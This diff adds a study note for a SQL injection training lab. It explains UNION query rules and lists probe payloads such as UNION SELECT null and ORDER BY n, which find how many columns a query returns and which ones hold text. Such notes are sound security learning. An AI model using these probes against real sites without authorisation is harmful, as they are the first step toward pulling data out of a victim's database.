@@ -1,0 +1,41 @@
+Lab #4: SQL injection UNION attack, determining  columns containing text 
+
+    Target Goal:
+         Determine the number of columns returned by the query and finding the column that contains text feild 
+
+    Analysis:
+
+         table1         table2   
+         a | b          c | d
+         -----          ------ 
+         1 , 2          2 , 3 
+         3 , 4          4 , 5
+
+         query #1: select a, b from table1 
+         1 , 2
+         3 , 4
+
+         query #2: select a, b from table1 UNION select c, d from table2 
+         1 , 2
+         3 , 4
+         2 , 3 
+         4 , 5     
+         
+         Rule: 
+            1. The number and the order of the columns must be the same in all queries
+            2. The data must be compatible  
+
+       Step01: Finding the number of columns 
+
+        Type1:
+         SELECT * FROM table1 UNION SELECT null--  (if error -> incorrect number of columns)
+         select * FROM table1 UNION SELECT null, null-- (if 200 response -> correct number of columns)
+        
+        Type2:
+          select * FROM table order by 1-- (if not error -> column exists in table1)
+          select * FROM table order by 2-- (if error -> column does not exist in table1)
+
+       Step02: Finding whether a column contains a text or not 
+
+         select * FROM table1 UNION SELECT 'a', null-- (if error -> Column does not contain a text)
+         select * FROM table1 UNION SELECT null, 'a'-- (if no error -> Column does contain a text)
